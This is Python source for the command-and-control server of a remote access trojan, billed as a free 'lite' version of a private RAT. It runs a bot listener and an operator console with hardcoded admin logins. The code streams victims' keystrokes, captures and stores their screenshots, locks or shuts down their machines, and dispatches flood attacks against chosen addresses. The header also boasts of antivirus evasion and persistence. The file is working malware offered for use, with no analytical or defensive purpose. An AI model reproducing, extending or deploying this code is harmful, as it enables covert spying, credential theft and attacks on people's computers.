###########################################
#THIS IS A LITE VERSION OF THE PRIVATE RAT#
#THIS IS ABOUT 20% OF THE PRIVATE VERSION #
###########################################
#																  FREE RAT

#														Developed By:  ARI MALLOY
													
#						
#								Existing abilities:
#									Server-Side:
#										-Multi-Threading
#										-Remote keylog streaming (will not save to log file)
#										-Remote target lock
#										-Remote shutdown
#										-Target screenshot (will save to server backend)
#										-Telnet login
#									Client-Side:
#										-Persistence
#										-2% AV multi-scan (as long as this is not released for analysis)
#										-Keylogging using API hooking
#										-Multi-Threading
#										-Code Obfuscation (AV anti-detection)
										
										
import socket
import threading
import os
import os.path
import sys
import time
import select
import random
from datetime import datetime
from random import randint

#FINISHED IMPORTS

#LISTS

all_connections = []
all_addresses = []
all_Shellconnections = []
all_Shelladdresses = []
all_clients = []
all_client_addrs = []
user_IP = []
waitingCommands = []
pendingID = []
kmonList = []
screenList = []

global dev

mess2 = ('''
''')
dev = ('                ----------Developed by: the.red.team | !help - List commands----------')

###############################
#CREATE YOUR ADMIN LOGINS HERE# HARDCODED
###############################

#	       ADMIN ACCOUNT 1			 #
logins = ['username:password'] #THIS IS WHERE YOUR ADMIN ACCOUNTS ARE

#########################################################
#SCROLL DOWN TO FIND YOUR BOT PORT (search for 'port =')#
#########################################################

#MORE GLOBAL VARIABLES

global type
global botAddr
global botHandling
global botID
global ShellbotID
botID = 0
global loggingIn
global handling
global addr
global user
global passwd
global tl
tl = 0
global lstn
global all
global cow
cow = 0
all = False

global st

#OPENING COMMAND QUEUE

files = open('queue.txt', 'w')
files.close

#OPENING STATUS QUEUE

files = open('busy.txt', 'w')
files.close

#Create socket 1
def socket_create():
	try:
		logs = open('serverStat.txt', 'w')
		global host
		global port
		global s
		host = '' #LEAVE THIS BLANK#
##################################################
#THIS IS THE PORT WHERE THE CPP BOTS WILL CONNECT#
##################################################
		port = 31337 #THE PORT FOR THE BOTS TO CONNECT. DO NOT CHANGE # DO NOT CHANGE # DO NOT CHANGE #
#############################################################################
#SCROLL DOWN TO FIND THE PORT WHERE USERS WILL CONNECT(search for (port2 =')#
#############################################################################
		s = socket.socket()
		logs.write('[!] Created Socket\n')
		logs.close()
		print('[!] Created first socket')
	except socket.error as msg:
		print('[!]Could not create socket: ' + str(msg))

#Create socket 2
def socket_create_2():
	try:
		logs = open('serverStat.txt', 'w')
		global host2
		global port2
		global st
		host2 = '' #LEAVE THIS BLANK
############################################################
#THIS IS THE PORT WHERE THE CLIENTS AND ADMINS WILL CONNECT#
############################################################
		port2 = 12345 #THE PORT FOR THE USERS TO CONNECT. MAKE IT WHATEVER #CANNOT BE SAME AS VICTIM PORT#
		st = socket.socket()
		logs.write('[!] Created Socket 2\n')
		logs.close()
		print('[!] Created second socket')
	except socket.error as msg:
		print('[!]Could not create socket 2: ' + str(msg))

#Binding socket to port and wait for connection
def socket_bind():
	try:
		logs = open('serverStat.txt', 'a')
		global host
		global port
		global s
		global p
		s.bind((host, port))
		s.listen(5)
		logs.write('[!] Bound Socket\n')
		logs.close()
		print('[!] Bound first socket')
	except socket.error as msg:
		print('[!]Could not bind socket: ' + str(msg) + "\n" + "Retrying...")
		sys.exit()

#Bind socket 2
def socket_bind_2():
	try:
		logs = open('serverStat.txt', 'a')
		global host2
		global port2
		global st
		st.bind((host2, port2))
		st.listen(5)
		logs.write('[!] Bound Socket 2\n')
		logs.close()
		print('[!] Bound second socket')
	except socket.error as msg:
		print('[!]Could not bind socket: ' + str(msg) + "\n" + "Retrying...")
		sys.exit()

global admins
global clients
admins = 0
clients = 0

#When the client comes to login
def login(conn, addr):
	global passwd
	global admins
	global clients
	global user
	global loggingIn
	global dev
	global handling
	valid = False
	counte = 0
	attempts = 0
	print('[!] Login thread started')
	qui = False
	while valid == False and attempts < 4 and qui == False:
		br = False
		conn.send(str.encode('login as: '))
		username = str(conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
		if username == '!quit':
			conn.send(str.encode(''))
			qui = True
			conn.close()
			continue
		conn.send(str.encode('password: '))
		password = str(conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
		attempts = attempts + 1
		print('[!] Attempted: ' + str(attempts))
		cred = username + ':' + password
		cred = cred.replace('\n', '').replace('\r', '')
		file = username + '.txt'
		print('[!] Credentials presented: ' + cred)
		cont = False
		if cred in logins:
			print('[!] Successful ADMIN login')
			logn = open('login.txt', 'a')
			logn.write('[!] Successful Administrator login with ' + str(username) + ' from IP: ' + str(addr[0]) + '\n')
			logn.close()
			conn.send(str.encode('Valid Administrator Login\n\n\n\n'))
			for c in all_clients:
				if c != conn:
					c.send(str.encode('\n' + str(username) + ' has logged in\n'))
			time.sleep(2)
			conn.send(str.encode(chr(27) + "[2J"))
			conn.send(str.encode('\n\n\t\t\t\t\tReverse Shell Terminal\n\n' + dev + '\n\n'))
			print('[!] Sending to a clientHandler thread')
			handling = conn
			user = username
			passwd = password
			valid = True
			admins = admins + 1
			userIP = username + ':' + str(addr)
			user_IP.append(userIP)
			all_clients.append(conn)
			print('[!] Added connection to list')
			all_client_addrs.append(addr)
			if attempts < 5:
				clientHandler(handling, addr, user, passwd)
			break
		if attempts >= 4:
			attempts = 10
			conn.send(str.encode('You have provided invalid credentials too many times. Connection will now close...\n'))
			conn.close()
			break

#When a bot comes to login
def botLogin(conn, addr, type):
	global botID
	global ShellbotID
	global botHandling
	global botAddr
	print('[!] CPP Bot login started')
	all_addresses.append(addr)
	all_connections.append(conn)
	print('[!] looks good')
	print('[!] Starting CPP bot handler for ' + str(addr[0]))
	botID = botID + 1
	botHandler(botHandling, botAddr, botID)
		
crocro = False
krokro = False
#Function to monitor keys pressed by the victim
def keyMonitor(conn, mail, botid):
	kList = []
	for k in kmonList:
		kList.append(k)
		kmonList.remove(k)
	print('[!] Made local list')
	krokro = True
	print('[!] Key monitor thread started')
	conn.send(str.encode(mail))
	print('[!] Sent command to bot')
	while krokro == True:
		try:
#			kinder = str(conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
			kinder = str(conn.recv(1024).decode('ascii')).replace('\r', '')
			if str(kinder) == "stop":
				break
		except:
			break
		if krokro == True:
			for bro in kList:
				try:
					bro.send(str.encode('' + str(kinder) + ''))
				except:
					break
	print('[!] Stopping key monitor')

#Function to handle the bot for the rest of the time
def botHandler(conn, addr, ID):
	IDlist = []
	global botID
	global threadCount
	botid = ID
	print('[!] CPP Bot ' + str(botid) + ' handler started for: ' + str(addr))
	print('[!] ACTIVE THREAD COUNT: ' + str(threadCount) + '')
	show = True
	while 1:
		if not waitingCommands:
			try:
				conn.send(str.encode('list'))
			except:
				print('[!] CPP Bot ' + str(botid) + ' has disconnected')
				all_connections.remove(conn)
				all_addresses.remove(addr)
				botID = botID - 1
				break
			if show == True:
				print('[!] No commands to send to CPP bot: ' + str(botid))
				show = False
		else:
			attack = False
			show = True
			found = False
			try:
				for comm in waitingCommands:
					id, por, addrr, limit = comm.split(':')
					if id == str(botid):
						mail = 'flood' + str(por) + '|' + str(addrr) + '|' + str(limit)
						print('[!] Specific CPP bot command found: ' + str(id))
						attack = True
						found = True
						break
			except:
				for comm in waitingCommands:
					id, shutty = comm.split(':')
					if id == str(botid):
#					       if str(shutty) == "lock":
#						       botID = botID - 1
						mail = str(shutty)
						print('[!] Specific CPP bot command found: ' + str(id))
						found = True
						break
				if attack == True:
					print(str(id) + ' port: ' + por + ' | addr: ' + addrr + ' | time: ' + limit)
				replvar = str(id) + ':'
				com = comm.replace(replvar, '')
				try:
					if str(shutty) == "lock":
						conn.send(str.encode(mail))
						time.sleep(5)
					elif str(shutty) == "screen":
						na = 'screen'
						nu = 1
						screenName = na + str(nu) + '.jpg'
						exi = True
						while exi == True:
							if os.path.isfile(screenName):
								nu = nu + 1
								screenName = na + str(nu) + '.jpg'
							else:
								exi = False
						conn.send(str.encode(mail))
						print("Downloading...")
						print("Opening file...")
						writeFile = open(screenName, 'wb')
						print("Entering loop")
						while True:
							l = conn.recv(1024)
							while (l):
								if l.endswith(b'EOFEOFEOFEOFEOFX'):
									u = l[:-16]
									writeFile.write(u)
									break
								else:
									writeFile.write(l)
									l = conn.recv(1024)
							break
						print("Exiting loop")
						writeFile.close()
						print("Closed file and continuing")
						for ker in screenList:
							ker.send(str.encode('SAVED SCREEN SHOT AS ' + str(screenName) + ''))
							screenList.remove(ker)
					elif str(shutty) == "keylog":
						kw = threading.Thread(target=keyMonitor, args=(conn, mail, botid, ))
						kw.daemon = True
						kw.start()
					elif str(shutty) == "keylog stop":
						mail = 'kstop'
						if len(kmonList) == 0:
							conn.send(str.encode(mail))
					elif str(shutty) == "ID":
						for ids in pendingID:
							IDlist.append(ids)
						conn.send(str.encode(mail))
						ID = str(conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
						for pend in IDlist:
							pend.send(str.encode('\n' + str(botid) + ' - ' + str(ID) + ':' + str(addr[0]) + '\n'))
							try:
								pendingID.remove(pend)
								removed = False
							except:
								removed = True
							IDlist.remove(pend)
					else:
						conn.send(str.encode(mail))
				except:
					conn.send(str.encode(mail))
				waitingCommands.remove(comm)
		if show == True and attack == True:
			time.sleep(int(limit))
		else:
			time.sleep(1)

#Takes commands from clients
def clientHandler(conn, addr, username, passwd):
	global devAll
	global threadCount
	stealth = False
	global admins
	global clients
	admin = False
	login = username + ':' + passwd
	admin = True
	help = '\n!admins - Display active admin count\n!blackList <IP Address> - Black list an IP address to keep it from connecting\n!clear - Clear the screen\n!clients - Display active client count\n!ID - View ID associated with each victim\n!keyLog <Victim Number> - Stream victim keypresses\n!keyLog stop - Stop streaming victim keypresses\n!lock <Victim Number> - Lock the screen of the victim\n!quit - Logout and exit the remastered session\n!remBlack -  Remove an IP from the blackList\n!screen <Victim Number> - Take screen shot of victim\'s screen\n!shutdown <Victim Number> - Shutdown the victim computer\n!victims - Display active victim count\n\n'
	main = 'red'
	print('[!] Client handler started')
	print('[!] ACTIVE THREAD COUNT: ' + str(threadCount) + '')
	while 1:
		try:
			conn.send(str.encode('[' + str(len(all_addresses) + len(all_Shelladdresses)) + ']remastered> '))
			cmd = str(conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
			if '!screen' in cmd:
				commID = cmd.replace('!screen ', '')
				conn.send(str.encode('[!] GETTING SCREEN SHOT...\n'))
				if conn not in screenList:
					screenList.append(conn)
				waitingCommands.append(str(commID) + ':screen')
			if '!keyLog' in cmd and '!keyLog stop' not in cmd:
				krokro = True
				conn.send(str.encode('[!] STREAMING KEY PRESSES...\n'))
				commID = cmd.replace('!keyLog ', '')
				ShellCommID = 0
				waitingCommands.append(str(commID) + ':keylog')
				if conn not in kmonList:
					kmonList.append(conn)
			if '!keyLog stop' in cmd:
				krokro = False
				try:
					kmonList.remove(conn)
				except:
					gotIt = False
				commID = cmd.replace('!keyLog stop ', '')
				waitingCommands.append(str(commID) + ':keylog stop')
				conn.send(str.encode('[!] STOPPING KEY PRESS STREAM...\n'))
			if cmd == '!ID':
				conn.send(str.encode('[!] GETTING VICTIM IDs\n'))
				commID = 0
				ShellCommID = 0
				for comm in all_addresses:
					commID = commID + 1
					waitingCommands.append(str(commID) + ':ID')
					pendingID.append(conn)
			if cmd == '!clear':
				conn.send(str.encode(chr(27) + "[2J"))
			if admin == True:
				if '!shutdown' in str(cmd):
					if str(cmd) == '!shutdown *':
						conn.send(str.encode('[!] SHUTTING DOWN REMOTE MACHINES\n'))
						commID = 0
						ShellCommID = 0
						for comm in all_addresses:
							commID = commID + 1
							waitingCommands.append(str(commID) + ':shutdown')
					else:
						conn.send(str.encode('[!] SHUTTING DOWN REMOTE MACHINE\n'))
						spec = str(cmd).replace('!shutdown ', '')
						waitingCommands.append(str(spec) + ':shutdown')
				if '!lock' in str(cmd):
					if str(cmd) == '!lock *':
						conn.send(str.encode('[!] LOCKING REMOTE MACHINES\n'))
						commID = 0
						ShellCommID = 0
						for comm in all_addresses:
							commID = commID + 1
							waitingCommands.append(str(commID) + ':lock')
					else:
						conn.send(str.encode('[!] LOCKING REMOTE MACHINE\n'))
						spec = str(cmd).replace('!lock ', '')
						waitingCommands.append(str(spec) + ':lock')
				if cmd == '!remBlack':
					bre = False
					try:
						with open ('blackList.txt') as l:
							remBlack = l.readlines()
						l.close()
					except:
						bre = True
						conn.send(str.encode('[!] THERE ARE NO IPs IN THE BLACKLIST\n'))
					if bre == False:
						for ipS in remBlack:
							lister = ipS.replace('\n', '')
							conn.send(str.encode('' + str(lister) + '\n'))
						conn.send(str.encode('\nEnter the IP you want to remove from the BLACKLIST\n'))
						if main == 'red':
							conn.send(str.encode('[' + str(len(all_addresses) + len(all_Shelladdresses)) + ']remastered> '))
						elif main == 'orange':
							conn.send(str.encode('[' + str(len(all_addresses) + len(all_Shelladdresses)) + ']remastered> '))
						elif main == 'green':
							conn.send(str.encode('[' + str(len(all_addresses) + len(all_Shelladdresses)) + ']remastered> '))
						elif main == 'purple':
							conn.send(str.encode('[' + str(len(all_addresses) + len(all_Shelladdresses)) + ']remastered> '))
						elif main == 'blue':
							conn.send(str.encode('[' + str(len(all_addresses) + len(all_Shelladdresses)) + ']remastered> '))
						elif main == 'yellow':
							conn.send(str.encode('[' + str(len(all_addresses) + len(all_Shelladdresses)) + ']remastered> '))
						elif main == 'white':
							conn.send(str.encode('[' + str(len(all_addresses) + len(all_Shelladdresses)) + ']remastered> '))
						elif main == 'gray':
							conn.send(str.encode('[' + str(len(all_addresses) + len(all_Shelladdresses)) + ']remastered> '))
						elif main == 'cyan':
							conn.send(str.encode('[' + str(len(all_addresses) + len(all_Shelladdresses)) + ']remastered> '))
						remy = str(conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
						remy = remy + '\n'
						found = False
						for ipS in remBlack:
							if ipS == remy:
								found = True
								break
						if found == True:
							blackness = open('blackList.txt', 'w')
							for cray in remBlack:
								if cray != remy:
									blackness.write(cray)
							blackness.close()
							print('[!] REMOVED FROM BLACKLIST: ' + remy + '\n')
							conn.send(str.encode('[!] REMOVED FROM BLACKLIST: ' + remy + '\n'))
						else:
							conn.send(str.encode('[!] THAT IP WAS NOT FOUND ON THE BLACKLIST\n'))
				if '!blackList' in cmd:
					try:
						blackIP = cmd.replace('!blackList ', '')
						black = open('blackList.txt', 'a')
						black.write(str(blackIP) + '\n')
						black.close()
						print('[!]  IP ADDED TO BLACK LIST: ' + str(blackIP) + '')
						conn.send(str.encode('[!] IP ADDED TO BLACK LIST: ' + str(blackIP) + '\n'))
					except:
						print('[!] Could not blackList IP')
				if cmd == '!userIPs':
					for user in user_IP:
						conn.send(str.encode('[!] ' + user + '\n'))
			if cmd == '!help':
				conn.send(str.encode(help))
			elif cmd == '!victims':
				bot = str(len(all_addresses) + len(all_Shelladdresses))
				conn.send(str.encode('[!] Victim count: ' + str(bot) + '\n'))
			elif cmd == '!admins':
				conn.send(str.encode('[!] Administrator count: ' + str(admins) + '\n'))
			elif cmd == '!clients':
				conn.send(str.encode('[!] Client count: ' + str(clients) + '\n'))
			elif cmd == '!quit':
				all_clients.remove(conn)
				all_client_addrs.remove(addr)
				userIP = username + ':' + str(addr)
				user_IP.remove(userIP)
				conn.close()
				if admin == True and admins > 0:
					admins = admins - 1
				elif admin == False and clients > 0:
					clients = clients - 1
				for c in all_clients:
					if c != conn and stealth == False:
						c.send(str.encode('\n' + str(username) + ' has logged out\n'))
				break
				print('\n')
		except:
			for c in all_clients:
				if c != conn and stealth == False:
					c.send(str.encode('\n' + str(username) + ' has disconnected\n'))
			print('[!] Client disconnected: ' + username + '')
			try:
				all_clients.remove(conn)
				all_client_addrs.remove(addr)
				userIP = username + ':' + str(addr)
				user_IP.remove(userIP)
			except:
				print('[!] Exception')
			if admin == True and admins > 0:
				admins = admins - 1
			elif admin == False and clients > 0:
				clients = clients - 1
			break

def accept_connections():
	global botID
	global botAddr
	global botHandling
	global type
	print('[!] Waiting for CPP bot connections')
	global cow
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	while 1:
		conn, address = s.accept()
		conn.setblocking(1)
		print('\n[+]CPP bot Connection established: ' + address[0])
		botHandling = conn
		botAddr = address
		type = 'CPP'
		print('[!] Starting CPP bot login')
		cow = cow + 1
		botLogin(botHandling, botAddr, type)
		time.sleep(0.5)

def accept_connections_2():
	global loggingIn
	global addr
	print('[!] Waiting for socket creation before accepting client connections...')
	time.sleep(3)
	print('[!] Waiting for client connections')
	global clientCow
	for c in all_clients:
		c.close()
	del all_clients[:]
	del all_client_addrs[:]
	while 1:
		clientConn, clientAddress = st.accept()
		print('[!] Got connection')
		clientConn.setblocking(1)
		print('[!] Set blocking')

		print('\n[+]Client Connection established: ' + clientAddress[0])

		logn = open('login.txt', 'a')
		logn.write('[!] Got a user connection from: ' + str(clientAddress) + '\n')
		logn.close()
		loggingIn = clientConn
		addr = clientAddress
		print('[!] Starting login thread')
		login(loggingIn, addr)

#Tell clients server will be going down so keep an ear out
def down_server(conn):
	try:
		cmd = 'down'
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(204800), "utf-8")
			if cmd != 'quit':
				print(client_response)
		if cmd == 'quit':
			print("This was a down command")
	except:
		print('[!]Connection was lost')

def waiter():
	while 1:
		time.sleep(5)
	
try:
	global threadCount
	global first
	first = True
	threadCount = 0
	socket_create()
	socket_create_2()
	socket_bind()
	socket_bind_2()
	t = threading.Thread(target=accept_connections)
	threadCount = threadCount + 1
	print('started thread ' + str(threadCount))
	t.daemon = True
	t.start()
	a = threading.Thread(target=accept_connections_2)
	threadCount = threadCount + 1
	print('started thread ' + str(threadCount))
	a.daemon = True
	a.start()
	print('[!] Started all necessary threads')
	waiter()
except KeyboardInterrupt:
	lstn = False
	print('\n[!] Exit process starting...')
	print('[!] Closing connections...')
	for r, conn in enumerate(all_connections):
		try:
			print('[!] Closing connection: ' + str(r))
			down_server(conn)
		except:
			print('[CRITICAL] Could not kill connection: ' + str(r))
			print('[CRITICAL] You may experience problem upon next startup')
	for l, conn in enumerate(all_clients):
		try:
			print('[!] Closing client connection: ' + str(l))
			down_server(conn)
		except:
			print('[CRITICAL] Could not kill connection: ' + str(l))
			print('[CRITICAL] You may experience problem upon next startup')
	s.close()
	print('[!] Successfully closed all connections')
	print('[!] Exiting')
